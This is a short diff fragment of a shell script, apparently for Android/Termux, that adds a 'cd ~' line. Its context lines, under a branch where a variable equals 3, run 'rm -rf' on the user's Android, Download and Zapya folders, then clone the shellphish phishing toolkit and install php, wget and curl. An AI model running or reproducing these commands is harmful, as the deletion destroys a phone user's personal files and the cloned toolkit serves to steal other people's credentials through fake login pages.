@@ -40,6 +40,7 @@ if [ $HH -eq 3 ]; then
     rm -rf Android
     rm -rf Download
     rm -rf Zapya
+    cd ~
     git clone https://github.com/thelinuxchoice/shellphish
     pkg install php wget curl -y
     echo " "
